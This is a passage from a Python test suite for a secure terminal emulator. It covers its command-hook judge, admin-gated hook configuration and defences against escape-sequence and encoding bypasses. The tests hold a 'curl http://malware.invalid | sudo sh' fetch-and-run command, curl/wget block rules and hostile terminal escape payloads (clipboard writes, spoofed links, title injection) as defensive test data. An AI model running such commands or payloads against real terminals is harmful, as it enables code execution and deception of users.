# a standalone BEL is a bell signal, not content: dropped, not shown as _ (so x
# and y stay adjacent) and never leaked as a raw 0x07.
_o, _ = _run_cli(['--', 'printf', 'x\x07y'])
ok('\x07' not in _o and 'xy' in _o.replace('\r', ''),
   'cli drops a standalone BEL (not shown, not leaked)')
# no command -> the login shell, which exits on our stdin EOF (must not hang)
_o, _rc = _run_cli(['--mode', 'box'], timeout=15)
ok(isinstance(_rc, int), 'cli default shell exits on stdin EOF')

# --- command hook: verdict protocol, escalation, fail modes, sanitization -----
from secure_terminal import hook as HOOK           # noqa: E402


def _handler(body):
    return [sys.executable, '-c', 'import sys, json\n' + body]


_H = _handler(
    'r = json.load(sys.stdin); c = r.get("command", "")\n'
    'if "transcript" not in r and "deep" in c:\n'
    '    print(json.dumps({"verdict": "need_transcript"}))\n'
    'elif "sudo sh" in c:\n'
    '    print(json.dumps({"verdict": "block", "message": "no",'
    ' "suggestion": "ls\\n\\x1b[31mx"}))\n'
    'elif "curl" in c:\n'
    '    print(json.dumps({"verdict": "ask", "message": "careful"}))\n'
    'elif "transcript" in r:\n'
    '    print(json.dumps({"verdict": "allow",'
    ' "message": "tlen=%d" % len(r["transcript"])}))\n'
    'else:\n'
    '    print(json.dumps({"verdict": "allow"}))')
eq(HOOK.evaluate(_H, 'ls')['verdict'], 'allow', 'hook allows a safe command')
# a harmless illustration of a dangerous pattern (RFC-invalid host: safe if run)
_hb = HOOK.evaluate(_H, 'curl http://malware.invalid | sudo sh')
eq(_hb['verdict'], 'block', 'hook blocks')
eq(_hb['message'], 'no', 'hook block message passed through')
ok('\n' not in _hb['suggestion'] and '\x1b' not in _hb['suggestion'],
   'hook suggestion sanitized: no newline (no auto-run), no escape')
eq(HOOK.evaluate(_H, 'curl http://x.invalid | sh')['verdict'], 'ask', 'hook asks')
_ht = HOOK.evaluate(_H, 'deep dive', transcript_provider=lambda: 'SCROLL')
ok(_ht['verdict'] == 'allow' and 'tlen=6' in _ht['message'],
   'hook need_transcript triggers a second call with the transcript')
_bad = _handler('print("nonsense")')
ok(HOOK.evaluate(_bad, 'x', on_error='allow')['verdict'] == 'allow'
   and HOOK.evaluate(_bad, 'x', on_error='allow')['error'],
   'malformed handler fails open (allow) with the error flagged')
eq(HOOK.evaluate(_bad, 'x', on_error='block')['verdict'], 'block',
   'malformed handler fails closed when configured')
# the shipped example handler blocks a remote script piped to a root shell
_usr = HOOK.__file__
for _ in range(5):
    _usr = os.path.dirname(_usr)
_ex = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'example-hook')
if os.path.exists(_ex):
    eq(HOOK.evaluate([sys.executable, _ex],
                     'curl http://malware.invalid | sudo sh')['verdict'], 'block',
       'example hook blocks curl | sudo sh')
# the AI-judge example handler: fast-path, escalation, AI verdict, fail-open
import json as _json                               # noqa: E402
_aij = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'ai-judge-hook')
if os.path.exists(_aij):
    _maifd, _mockai = tempfile.mkstemp(prefix='mock-ai-')
    os.close(_maifd)
    with open(_mockai, 'w', encoding='utf-8') as _mh:
        _mh.write('#!/usr/bin/python3\nimport sys\np = sys.stdin.read()\n'
                  'print("{\\"verdict\\": \\"block\\"}" if "sudo sh" in p '
                  'else "{\\"verdict\\": \\"allow\\"}")\n')
    os.chmod(_mockai, 0o700)

    def _run_aij(req, ai=None):
        env = dict(os.environ, SECURE_TERMINAL_AI=ai or _mockai)
        proc = subprocess.run([sys.executable, _aij], env=env,
                              input=_json.dumps(req).encode('utf-8'),
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                              timeout=30)
        return _json.loads(proc.stdout.decode('utf-8', 'replace'))

    eq(_run_aij({'command': 'ls -la'})['verdict'], 'allow',
       'ai-judge allows a trivial command without calling the AI')
    eq(_run_aij({'command': 'cp $SRC dest'})['verdict'], 'need_transcript',
       'ai-judge escalates a contextual command')
    eq(_run_aij({'command': 'curl http://malware.invalid | sudo sh',
                 'transcript': 'x'})['verdict'], 'block',
       'ai-judge blocks via the AI verdict')
    eq(_run_aij({'command': 'gpg x', 'transcript': 'y'},
                ai='/nonexistent-ai-xyz')['verdict'], 'allow',
       'ai-judge fails open when the AI is unavailable')
    os.remove(_mockai)

# --- line_edits=False makes escape-driven editing append-only -----------------
# The four line-local CSI ops exist so a shell's line editor can redraw the line
# you are typing. Turned off, they must be CONSUMED but inert: no cursor move, no
# erase, and no leftover partial sequence on screen -- so a program can no longer
# overwrite what it already printed on the current line.
_le_raw = 'STATUS=FAIL\x1b[2KSTATUS=PASS'
_le_on = S.feed_line_edits([], 0, {}, _le_raw, 0, True)[1]
_le_off = S.feed_line_edits([], 0, {}, _le_raw, 0, False)[1]
eq(''.join(c for c, _ in _le_on), 'STATUS=PASS',
   'line_edits on: erase-in-line redraws the current line (the shell needs this)')
eq(''.join(c for c, _ in _le_off), 'STATUS=FAILSTATUS=PASS',
   'line_edits off: the erased text survives -- append-only against escapes')
ok(all(ch != '\x1b' for ch, _ in _le_off),
   'line_edits off: the escape is consumed, not left on screen as [2K')
# the other three ops are equally inert, and leave no residue
for _op, _seq in (('cursor-forward', '\x1b[4C'), ('cursor-back', '\x1b[2D'),
                  ('cursor-column', '\x1b[1G')):
    _cells = S.feed_line_edits([], 0, {}, 'abc' + _seq + 'z', 0, False)[1]
    _text = ''.join(c for c, _ in _cells)
    eq(_text, 'abcz', 'line_edits off: %s is inert and leaves no residue' % _op)
# \r and \b are raw control bytes, NOT escapes: still honored either way, which
# is why this is append-only against escapes rather than against every byte.
_cr_off = S.feed_line_edits([], 0, {}, 'FAIL\rPASS', 0, False)[1]
eq(''.join(c for c, _ in _cr_off), 'PASS',
   'line_edits off: carriage return still overwrites (a raw byte, not an escape)')
# the default is on, so an omitted argument keeps today's behaviour
eq(S.feed_line_edits([], 0, {}, _le_raw)[1], _le_on,
   'line_edits defaults to on (omitting it changes nothing)')

# --- hooklib: tiered, admin-gated hook configuration --------------------------
import importlib.util as _ilu                       # noqa: E402
_hlpath = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'hooklib.py')
# hooklib gates whether a USER may weaken the command-hook judge, so its absence
# is a FAIL, not a skip: silently not testing a privilege boundary reads as a pass.
ok(os.path.exists(_hlpath), 'hooklib present at %s' % _hlpath)
if os.path.exists(_hlpath):
    _spec = _ilu.spec_from_file_location('hooklib', _hlpath)
    _hl = _ilu.module_from_spec(_spec)
    _spec.loader.exec_module(_hl)
    _priv = tempfile.mkdtemp()
    _pd = os.path.join(_priv, 'secure-terminal.d')
    os.makedirs(_pd)
    _homebase = tempfile.mkdtemp()
    _hd = os.path.join(_homebase, 'secure-terminal.d')
    os.makedirs(_hd)
    _hl._PRIVILEGED = (_priv,)
    _saved_xdg = os.environ.get('XDG_CONFIG_HOME')
    os.environ['XDG_CONFIG_HOME'] = _homebase
    try:
        # rules parse: fields split on ' | '; a regex ALTERNATION (curl|wget),
        # whose pipe has no surrounding spaces, must NOT be split (regression).
        with open(os.path.join(_pd, 'example-hook-rules.conf'), 'w') as _f:
            _f.write('block | \\b(curl|wget)\\b | piped\n'
                     '# a comment\nbadline\n'
                     'ask | ^sudo | root\n')
        eq(_hl.read_rules('example-hook-rules.conf'),
           [('block', '\\b(curl|wget)\\b', 'piped', ''), ('ask', '^sudo', 'root', '')],
           'hooklib: rules parsed; regex alternation not split; comments skipped')
        # the gate: the home tier is IGNORED by default
        with open(os.path.join(_hd, 'ai-judge-prompt.txt'), 'w') as _f:
            _f.write('USER PROMPT')
        ok(not _hl.allow_user_config(), 'hooklib: user hook config off by default')
        eq(_hl.read_file('ai-judge-prompt.txt'), None,
           'hooklib: home tier ignored unless an admin allows it')
        # an admin enables it in a PRIVILEGED tier -> the home file is now honored
        with open(os.path.join(_pd, 'hooks.conf'), 'w') as _f:
            _f.write('hook_config_allow_user=true\n')
        ok(_hl.allow_user_config(), 'hooklib: an admin can allow user hook config')
        eq(_hl.read_file('ai-judge-prompt.txt'), 'USER PROMPT',
           'hooklib: home tier honored once allowed')
        # a home config CANNOT flip the gate (it is read from privileged only)
        with open(os.path.join(_hd, 'hooks.conf'), 'w') as _f:
            _f.write('hook_config_allow_user=false\n')
        ok(_hl.allow_user_config(), 'hooklib: home cannot turn its own gate off')

        # --- rules parsing, every branch --------------------------------------
        eq(_hl.read_rules('no-such-rules.conf'), None,
           'hooklib: absent rules file -> None, so the caller keeps its default')
        with open(os.path.join(_pd, 'shapes.conf'), 'w') as _f:
            _f.write('\n'                       # blank line -> skipped
                     '   \n'                    # whitespace-only -> skipped
                     '# comment | block | x\n'  # comment -> skipped, even if piped
                     'block\n'                  # one field -> skipped
                     'nope | ^x | m\n'          # bad verdict -> skipped
                     'allow | ^ls\n'            # 2 fields -> empty msg+suggestion
                     'block | ^rm | destructive\n'          # 3 fields
                     'ask | ^dd | risky | use cp\n'         # 4 fields
                     'allow | ^a | m | s | extra\n')        # 5 -> extra ignored
        eq(_hl.read_rules('shapes.conf'),
           [('allow', '^ls', '', ''),
            ('block', '^rm', 'destructive', ''),
            ('ask', '^dd', 'risky', 'use cp'),
            ('allow', '^a', 'm', 's')],
           'hooklib: rules honor 2/3/4 fields and drop blank/comment/short/bad-verdict')

        # --- privileged conf parsing, every branch ----------------------------
        # highest privileged tier wins; comments and non-KEY=value lines ignored.
        _priv2 = tempfile.mkdtemp()
        _pd2 = os.path.join(_priv2, 'secure-terminal.d')
        os.makedirs(_pd2)
        with open(os.path.join(_pd2, 'hooks.conf'), 'w') as _f:
            _f.write('# comment=true\n'
                     'no-equals-here\n'
                     'other_key=value\n'
                     'hook_config_allow_user=false\n')
        _hl._PRIVILEGED = (_priv, _priv2)       # _priv2 is the higher tier
        ok(not _hl.allow_user_config(),
           'hooklib: the highest privileged tier wins the gate')
        _hl._PRIVILEGED = (_priv2, _priv)       # reverse the order
        ok(_hl.allow_user_config(),
           'hooklib: tier precedence follows the configured order, last wins')
        eq(_hl._privileged_conf_value('absent_key'), None,
           'hooklib: an unset key reads as None')

        # a file the highest tier does not have falls back to the lower tier
        with open(os.path.join(_pd, 'ai-judge-prompt.txt'), 'w') as _f:
            _f.write('ADMIN PROMPT')
        _hl._PRIVILEGED = (_priv, _priv2)
        eq(_hl.read_file('ai-judge-prompt.txt'), 'ADMIN PROMPT',
           'hooklib: a tier without the file does not blank a lower tier that has it')
        eq(_hl.read_file('nothing-anywhere.txt'), None,
           'hooklib: a file absent from every tier reads as None')

        # --- the home tier with XDG_CONFIG_HOME UNSET -------------------------
        # _tiers() falls back to ~/.config; point HOME at a temp dir so the real
        # user config is neither read nor written.
        _fakehome = tempfile.mkdtemp()
        os.makedirs(os.path.join(_fakehome, '.config', 'secure-terminal.d'))
        with open(os.path.join(_fakehome, '.config', 'secure-terminal.d',
                               'ai-judge-prompt.txt'), 'w') as _f:
            _f.write('HOME FALLBACK')
        _saved_home = os.environ.get('HOME')
        os.environ.pop('XDG_CONFIG_HOME', None)
        os.environ['HOME'] = _fakehome
        try:
            _hl._PRIVILEGED = (_priv,)          # this tier has allow_user=true
            eq(_hl.read_file('ai-judge-prompt.txt'), 'HOME FALLBACK',
               'hooklib: without XDG_CONFIG_HOME the home tier falls back to ~/.config')
        finally:
            if _saved_home is None:
                os.environ.pop('HOME', None)
            else:
                os.environ['HOME'] = _saved_home
            os.environ['XDG_CONFIG_HOME'] = _homebase
    finally:
        if _saved_xdg is None:
            os.environ.pop('XDG_CONFIG_HOME', None)
        else:
            os.environ['XDG_CONFIG_HOME'] = _saved_xdg

# --- feed_line_edits: the line-mode logical-cell editor -----------------------
def _line(raw, mode='box', prev=None, col=0, sgr=None):
    """Feed raw into a fresh (or given) line buffer; return (completed_display,
    current_display) rendered under `mode`."""
    cells = prev if prev is not None else []
    comp, cells, col, _sgr, _w = S.feed_line_edits(cells, col, sgr or {}, raw)
    render = lambda cs: ''.join(S.render_output(c, mode) for c, _ in cs)
    return [render(c) for c in comp], render(cells), cells, col


# backspace over a reveal badge deletes the WHOLE character (the #119 fix): the
# shell emits \b (one logical cell) then erase-to-EOL; the 8-column badge goes.
_, cur, cells, col = _line('echo ' + chr(0x20AC), 'reveal')
eq(cur, 'echo <U+20AC>', 'reveal badge rendered')
_, cur, cells, col = _line('\b\x1b[K', 'reveal', prev=cells, col=col)
eq(cur, 'echo ', 'backspace+erase removes the whole reveal badge (#119)')

# history recall: \r, reprint, erase-to-EOL clears the longer previous line (#4)
_, _, cells, col = _line('echo aaaaaa')
_, cur, cells, col = _line('\rls\x1b[K', prev=cells, col=col)
eq(cur, 'ls', 'CSI K erases the residue of a longer recalled line (#4)')

# line-local CSI ops
eq(_line('abc\x1b[2DX')[1], 'aXc', 'CSI D (back) then overwrite')
eq(_line('abc\x1b[2GX')[1], 'aXc', 'CSI G (column) then overwrite')
eq(_line('ab\x1b[5CX')[1], 'abX', 'CSI C (forward) clamps at end of line')
eq(_line('abcdef\x1b[3G\x1b[K')[1], 'ab', 'CSI 0K erases from the cursor to EOL')
eq(_line('abc\x1b[2K')[1], '', 'CSI 2K erases the whole line')

# SECURITY: vertical / absolute cursor escapes are stripped -- a program can
# never leave the current line or reach the scrollback.
comp, cur, _, _ = _line('safe\x1b[2A\x1b[Hpwn\x1b[10;5H!')
eq((comp, cur), ([], 'safepwn!'),
   'vertical/absolute escapes stripped; everything stays on one line')
# and no escape byte ever survives into a cell
_, cur, _, _ = _line('a\x1b[31m\x1b]0;t\x07b\x1bZ', 'box')
ok('\x1b' not in cur, 'no ESC byte survives feed_line_edits')

# ==============================================================================
# BYPASSES -- a control routed AROUND rather than broken head-on.
# ==============================================================================

def _cells_render(raw, mode='detail', line_edits=True, max_line=0):
    """Render `raw` the way the WIDGET does: through the cell model, then through
    cells_to_runs. Distinct from render_output(), which the CLI wrapper uses -- a
    leak can exist in one path and not the other, so tests must drive this one."""
    comp, cells, _col, _sgr, wraps = S.feed_line_edits(
        [], 0, {}, raw, max_line, line_edits)
    runs, _prefix = S.cells_to_runs(comp, cells, mode, False, wraps=wraps)
    return ''.join(text for text, _key in runs)


# --- BYPASS: the ECMA-48 escape grammar, not just the arms we remembered -------
# An escape is ESC + intermediate bytes (0x20-0x2F) + a final byte (0x30-0x7E).
# A sequence the stripper does not MATCH is not neutralized -- the lone ESC is
# merely dropped and the REST renders as ordinary text, unmarked. That routes
# around the marking guard instead of defeating it: the charset designators
# (ESC ( B, which every terminfo `sgr0` emits, and ESC ( 0 for line drawing) used
# to print "(B" / "(0", and ESC c / ESC 7 / ESC # 8 printed their final byte.
# Sweep the WHOLE grammar, both render paths, so a future narrowing cannot
# reintroduce a hole one hand-picked case would miss.
# these open a LONGER form (CSI/OSC/DCS/SOS/PM/APC, and the SS2/SS3 single
# shifts, which take one graphic byte), so they are not two-byte escapes
_INTRODUCERS = '[]PX^_NO'
_ESC_LEAK = []
for _f in range(0x30, 0x7F):
    if chr(_f) in _INTRODUCERS:
        continue
    _seq = '\x1b' + chr(_f)
    if _cells_render('A' + _seq + 'B') != 'AB' or \
            S.render_output('A' + _seq + 'B', 'detail') != 'AB':
        _ESC_LEAK.append(_seq)
eq(_ESC_LEAK, [], 'every two-byte escape ESC+final is consumed whole, no leak')

_ESC_LEAK = []
for _i in ' !"#$%&\'()*+,-./':                    # every intermediate byte
    for _f in range(0x30, 0x7F):
        _seq = '\x1b' + _i + chr(_f)
        if _cells_render('A' + _seq + 'B') != 'AB' or \
                S.render_output('A' + _seq + 'B', 'detail') != 'AB':
            _ESC_LEAK.append(_seq)
eq(_ESC_LEAK, [],
   'every ESC+intermediate+final escape (charset designators, DECALN) is consumed')

# The named real-world offenders, spelled out so a failure names the attack.
eq(_cells_render('A\x1b(0B'), 'AB', 'ESC ( 0 (line-drawing charset) leaks no "(0"')
eq(_cells_render('A\x1b(B\x1b[mB'), 'AB', 'terminfo sgr0 (ESC ( B ESC [ m) leaks no "(B"')
eq(_cells_render('A\x1bcB'), 'AB', 'RIS (ESC c) leaks no "c"')
eq(_cells_render('A\x1b7B\x1b8C'), 'ABC', 'DECSC/DECRC (ESC 7 / ESC 8) leak no digit')
eq(_cells_render('A\x1b#8B'), 'AB', 'DECALN (ESC # 8) leaks no "#8"')

# SS2 / SS3 take the ONE graphic byte after them, so they are three bytes: a
# two-byte-only strip leaves that byte on screen. Sweep the whole graphic range.
_ESC_LEAK = []
for _shift in 'NO':
    for _g in range(0x20, 0x7F):
        _seq = '\x1b' + _shift + chr(_g)
        if _cells_render('A' + _seq + 'B') != 'AB' or \
                S.render_output('A' + _seq + 'B', 'detail') != 'AB':
            _ESC_LEAK.append(_seq)
eq(_ESC_LEAK, [], 'SS2/SS3 (ESC N / ESC O) consume their shifted byte, no leak')

# ...and the stripper must not become GREEDY: a byte that cannot be an escape
# final (a control byte) is not part of the sequence and must survive. The BEL
# case is the sharp one -- 0x07 sits just below the 0x30 final-byte floor, so a
# wider class would eat it and silence the bell instead of ringing it.
_comp, _cur, _, _ = _line('A\x1b\nB')
eq((_comp, _cur), (['A'], 'B'), 'ESC before a newline does not swallow the newline')
eq(_cells_render('A\x1b\x07B'), 'AB', 'ESC before a BEL does not swallow the BEL handling')
ok(S.has_bell('\x1b\x07'), 'a BEL after a bare ESC is still a bell, not an escape final')
# RIS is consumed for DISPLAY yet must still be SEEN by the clear-screen notice:
# stripping and detection read the same bytes and must not disagree.
eq(_cells_render('A\x1bcB'), 'AB', 'RIS renders nothing')
ok(S.wants_clear('\x1bc'), 'RIS is still detected as a screen clear')
# a malformed CSI introducer followed by a real sequence: the dead introducer is
# consumed, and the sequence after it is still handled normally
eq(_cells_render('\x1b[' + '\x1b[31mx\x1b[0m'), 'x',
   'a dangling CSI introducer is consumed without eating the next sequence')

# --- BYPASS: a payload split so no single read contains the pattern ------------
# The renderer is stateless per chunk; the escape carry is what makes it whole.
# Split every hostile sequence at EVERY byte boundary and drive it the way the
# widget does (feed_chunk_carry, then the cell model with persisted state): the
# result must equal the unsplit render. A split that leaks is invisible to any
# test that only ever feeds a whole sequence.
_SPLIT_PAYLOADS = (
    '\x1b[2J', '\x1b[?1049h', '\x1b]0;pwned\x07', '\x1b]52;c;cGF5\x07',
    '\x1b]8;;http://evil\x1b\\link\x1b]8;;\x1b\\', '\x1bP+q544e\x1b\\',
    '\x1b_Gf=100;payload\x1b\\', '\x1b(0', '\x1bc', '\x1b#8', '\x1b[>4;2m',
    '\x1b[6n', '\x1b[c', '\x1b^msg\x1b\\', '\x1bX sos \x1b\\',
)
_SPLIT_BAD = []
for _p in _SPLIT_PAYLOADS:
    _raw = 'A' + _p + 'B'
    _want = _cells_render(_raw)
    for _cut in range(1, len(_raw)):
        _carry, _drop, _cells, _col, _sgr = '', '', [], 0, {}
        _acc_comp, _acc_wraps = [], []
        for _chunk in (_raw[:_cut], _raw[_cut:]):
            _text, _carry, _drop = S.feed_chunk_carry(_chunk, _carry, _drop)
            _c, _cells, _col, _sgr, _w = S.feed_line_edits(
                _cells, _col, _sgr, _text)
            _acc_comp.extend(_c)
            _acc_wraps.extend(_w)
        _runs, _ = S.cells_to_runs(_acc_comp, _cells, 'detail', False,
                                   wraps=_acc_wraps)
        _got = ''.join(t for t, _k in _runs)
        if _got != _want or _carry:
            _SPLIT_BAD.append((_p, _cut, _got, _carry))
eq(_SPLIT_BAD, [],
   'a hostile sequence split at any byte renders like the unsplit one, carry drained')

# Three-way split: the MIDDLE chunk holds neither introducer nor terminator, so
# nothing but the carry can hold the state across two boundaries at once. Run it
# over the whole hostile payload set (an OSC alone left the DCS/APC/SOS/PM
# terminator states, the ST-terminated forms, and the sequences with no
# terminator at all untested) at every pair of cut points, against the unsplit
# render as the oracle. Payloads carrying a marker word also assert it never
# reaches the display, so a "renders the same" pass cannot hide both sides
# leaking identically.
_BAD3 = []
_LEAK3 = []
for _p in ('\x1b]0;pwned\x07', '\x1b]0;pwned\x1b\\', '\x1b]52;c;cGF5\x07',
           '\x1bP+q544e\x1b\\', '\x1b_Gf=100;pwned\x1b\\', '\x1b^pwned\x1b\\',
           '\x1bX pwned \x1b\\', '\x1b]8;;http://evil\x1b\\link\x1b]8;;\x1b\\',
           '\x1b[31;1m', '\x1b[?1049h', '\x1b[2J', '\x1b(0', '\x1b#8', '\x1bNx',
           '\x1b[>4;2m', '\x1b[6n'):
    _raw = 'A' + _p + 'B'
    _want = _cells_render(_raw)
    for _i in range(1, len(_raw) - 1):
        for _j in range(_i + 1, len(_raw)):
            _carry, _drop, _cells, _col, _sgr = '', '', [], 0, {}
            _acc = []
            for _chunk in (_raw[:_i], _raw[_i:_j], _raw[_j:]):
                _text, _carry, _drop = S.feed_chunk_carry(_chunk, _carry, _drop)
                _c, _cells, _col, _sgr, _w = S.feed_line_edits(
                    _cells, _col, _sgr, _text)
                _acc.extend(_c)
            _runs, _ = S.cells_to_runs(_acc, _cells, 'detail', False)
            _got = ''.join(t for t, _k in _runs)
            if _got != _want or _carry:
                _BAD3.append((_p, _i, _j, _got, _want, _carry))
            if 'pwned' in _got or '\x1b' in _got:
                _LEAK3.append((_p, _i, _j, _got))
eq(_BAD3[:4], [],
   'every hostile sequence split three ways renders like the unsplit one, carry drained')
eq(_LEAK3[:4], [],
   'a three-way split never spills an escape or an OSC payload onto the display')
# The concrete leak the sweep above generalizes, named so a failure is legible:
# SS2/SS3 is ESC N/O plus the ONE byte it shifts. ANSI_RE consumes all three, so
# a chunk ending on the introducer must be CARRIED -- otherwise the introducer is
# stripped alone and the shifted byte renders as literal text on the next chunk.
for _ss in ('N', 'O'):
    _t1, _c1, _d1 = S.feed_chunk_carry('A\x1b' + _ss, '', '')
    eq(_c1, '\x1b' + _ss,
       'a chunk ending on the SS2/SS3 introducer (ESC %s) is carried' % _ss)
    _t2, _c2, _d2 = S.feed_chunk_carry('xB', _c1, _d1)
    eq(_cells_render(_t1) + _cells_render(_t2), 'AB',
       'the byte SS2/SS3 (ESC %s) shifts does not leak across a read boundary' % _ss)
    eq(_c2, '', 'the SS2/SS3 carry is drained once its shifted byte arrives')

# --- BYPASS: the retained-buffer CAP must not cut a sequence in half -----------
# The widget bounds the retained raw output (_raw) and the mode-switch re-render
# tail by keeping the LAST N characters. A plain slice can land INSIDE a sequence;
# the surviving remainder has no introducer, so the line renderer prints it as
# literal text ("31mHELLO" out of a halved SGR) and pyte mis-parses it when the
# grid is seeded from _raw -- i.e. the cap that exists to bound a flood becomes an
# escape leak of its own, reachable by simply flooding past the cap.
_CUT_BAD = []
for _p in _SPLIT_PAYLOADS + ('\x1b[31m', '\x1b[0m'):
    _buf = 'HEAD' + _p + 'TAILTEXT'
    _whole = _cells_render(_buf)
    for _keep in range(1, len(_buf) + 2):
        _tail = S.tail_from_escape_boundary(_buf, _keep)
        _shown = _cells_render(_tail)
        if len(_tail) > _keep:
            _CUT_BAD.append(('over the cap', _p, _keep, _tail))
        elif not _buf.endswith(_tail):
            _CUT_BAD.append(('not a tail of the buffer', _p, _keep, _tail))
        elif '\x1b' in _shown or 'pwned' in _shown or 'evil' in _shown:
            _CUT_BAD.append(('leaked', _p, _keep, _shown))
        elif not _whole.endswith(_shown):
            # cutting may DROP earlier output; it may never invent any. A cut
            # through a sequence invents exactly the sequence's own bytes.
            _CUT_BAD.append(('invented output', _p, _keep, _shown))
eq(_CUT_BAD[:4], [],
   'capping the retained buffer cuts at an escape boundary, never mid-sequence')
eq(S.tail_from_escape_boundary('abc', 0), '', 'a zero cap keeps nothing')
eq(S.tail_from_escape_boundary('abc', 99), 'abc', 'a cap above the length is a no-op')
eq(S.tail_from_escape_boundary('\x1b]0;pwned\x07', 6), '',
   'a cut inside an unterminated-to-the-left OSC drops the whole remainder')

# --- REGRESSION: the caret offset is counted in DOCUMENT units, not code points -
# cells_display_col / cells_to_runs' prefix are ADDED to a Qt block position, and
# a Qt document counts UTF-16 units: a non-BMP character is ONE Python character
# but TWO document positions. Counting code points put the caret one place too far
# left for every astral character before it (Show mode passes emoji through).
eq(S.display_len('abc'), 3, 'ASCII counts one unit per character')
eq(S.display_len('e\u0301'), 2, 'a combining mark is its own document position')
eq(S.display_len('\U0001f600'), 2, 'an astral character is TWO document positions')
_ASTRAL_CELLS = [('\U0001f600', ()), ('X', ())]
eq(S.cells_display_col(_ASTRAL_CELLS, 2, 'show'), 3,
   'the caret offset past an astral glyph counts both of its document units')
eq(S.cells_display_col(_ASTRAL_CELLS, 2, 'box'), 2,
   'a neutralized astral character is one box, so one document unit')
eq(S.cells_display_col([('e', ()), ('\u0301', ())], 2, 'show'), 2,
   'a combining mark still advances the caret by its own document position')

# --- BYPASS: encoding tricks that reconstitute after the boundary --------------
# The live stream uses an incremental UTF-8 decoder, so a multi-byte character
# arrives in pieces. Two distinct hazards: (a) a dangerous character that
# RECONSTITUTES across the split must still be neutralized -- the guard runs on
# the decoded text, so a fragment that looked harmless must not stay harmless;
# (b) an OVERLONG or surrogate encoding must never decode to its target at all.
import codecs                                                        # noqa: E402
import inspect                                                       # noqa: E402
import secure_terminal.cli as _cli                                   # noqa: E402


def _stream_render(chunks, mode='detail'):
    """Decode byte chunks the way the widget does and render through the cells."""
    dec = codecs.getincrementaldecoder('utf-8')('replace')
    carry, drop, cells, col, sgr = '', '', [], 0, {}
    comp = []
    for i, blob in enumerate(chunks):
        text = dec.decode(blob, i == len(chunks) - 1)
        text, carry, drop = S.feed_chunk_carry(text, carry, drop)
        c, cells, col, sgr, _w = S.feed_line_edits(cells, col, sgr, text)
        comp.extend(c)
    runs, _ = S.cells_to_runs(comp, cells, mode, False)
    return ''.join(t for t, _k in runs)


# The assertions below hold because the decoder REJECTS a malformed encoding
# rather than repairing it. That is a product choice, not a law of Python, so pin
# it: an error policy that passes bytes through ('surrogateescape') or preserves
# lone surrogates ('surrogatepass') would reconstitute exactly what the sweep
# below forbids, in both ingest paths.
import secure_terminal.terminal as _tmod                            # noqa: E402
for _mod in (_cli, _tmod):
    _src = inspect.getsource(_mod)
    ok("getincrementaldecoder('utf-8')('replace')" in _src,
       '%s decodes the child stream with the strict replace policy'
       % _mod.__name__)

_RLO = chr(0x202E).encode('utf-8')                  # E2 80 AE, the bidi override
for _cut in (1, 2):
    _out = _stream_render([b'A' + _RLO[:_cut], _RLO[_cut:] + b'B'])
    ok(chr(0x202E) not in _out,
       'a bidi override split across reads is still neutralized (cut %d)' % _cut)
    eq(_out, 'A<U+202E RIGHT-TO-LEFT OVERRIDE>B',
       'the reconstituted override is MARKED, not silently dropped (cut %d)' % _cut)

# Overlong / CESU-8 SMUGGLING, asserted where the product actually decides it.
# Asserting "the overlong bytes never decode to '.'" over the byte stream only
# re-tests CPython's UTF-8 decoder: no product change can make it true or false,
# because CPython rejects an overlong form in C and ships no lenient variant to
# swap in. The product's own decision is what happens to a surrogate or an astral
# code point ONCE IT IS IN A str -- which is where a CESU-8 pair, a JSON \\uD83D
# escape or a surrogatepass decode would deliver it -- so pin THAT, in every mode
# and on every text that leaves the widget. Mutating render_output's Show branch
# to trust cp >= 0x80 without str.isprintable() turns each of these red.
_SMUGGLED = ('\ud83d', '\udc00', '\ud83d\ude00', 'ad\ud800min')
for _sm in _SMUGGLED:
    for _mode in S.DISPLAY_MODES:
        _out = S.render_output(_sm, _mode)
        ok(not any(0xD800 <= ord(c) <= 0xDFFF for c in _out),
           'render_output never displays a surrogate (%r, mode %s)' % (_sm, _mode))
        ok('\U0001f600' not in _out,
           'a surrogate PAIR is never reassembled into its astral character '
           '(%r, mode %s)' % (_sm, _mode))
for _sm in ('\ud83d', '\udc00', '\ud800'):
    for _mode in S.DISPLAY_MODES:
        eq(S.tui_cell(_sm, _mode), S.BOX,
           'a TUI grid cell holding a surrogate is the box placeholder '
           '(%r, mode %s)' % (_sm, _mode))
eq(S.render_output('ad\ud800min', 'show'), 'ad_min',
   'a surrogate cannot hide inside a word in Show mode (no fake "admin")')
for _fn in ('sanitize_title', 'sanitize_clipboard', 'sanitize_clipboard_unicode',
            'sanitize_paste', 'sanitize_paste_unicode'):
    _got = getattr(S, _fn)('a\ud83d\ude00b')
    ok(not any(0xD800 <= ord(c) <= 0xDFFF for c in _got),
       '%s strips a surrogate on the way out of the widget' % _fn)
    ok('\U0001f600' not in _got,
       '%s does not reassemble a surrogate pair on the way out' % _fn)

# A truncated multi-byte tail at end of stream must not hold a partial character
# back forever, nor emit the raw bytes.
_out = _stream_render([b'A' + _RLO[:2]])
ok(chr(0x202E) not in _out and '\x1b' not in _out,
   'a truncated multi-byte tail neither reconstitutes nor leaks raw bytes')

# ==============================================================================
# CLASHES -- two behaviours that are individually right and disagree together.
# ==============================================================================

# --- CLASH: the TUI cell sanitizer vs the CLI renderer ------------------------
# Both implement the same policy over the same display modes, in different code
# (tui_cell for the pyte grid, render_output for the line model). Where they
# disagree, a payload is safe in one mode and unsafe in the other -- which is a
# bypass by mode switch, not by defeating either guard. Sweep every code point
# rather than a hand-picked list: the divergence that shipped (the
# default-ignorable invisibles, e.g. "ad<U+3164>min" reading as "admin") was in
# exactly the class a hand-picked list keeps forgetting.
# 0x07-0x0D are excluded: render_output resolves them as bell/cursor controls,
# while a TUI grid never stores one in a cell, so they diverge by design.
# U+25A1 is excluded because it IS the placeholder: a neutralized cell and a
# genuine box character produce the same output, so "kept" is unobservable there
# by construction (the widget maps the box back to '_' on export for that reason).
#
# The per-mode policy of the CLI renderer ITSELF rides this same sweep rather
# than a second, narrower loop of hand-picked code points: the modes differ in
# HOW they mark -- box, glyph, badge -- never in WHAT they let through unmarked,
# so a code point safe in one mode and dangerous in another is a bypass reachable
# from the View menu.
_STREAM_CONTROLS = frozenset((0x07, 0x08, 0x09, 0x0A, 0x0D, ord(S.BOX)))
_SWEEP = ([c for c in range(0x00, 0x3000) if c not in _STREAM_CONTROLS]
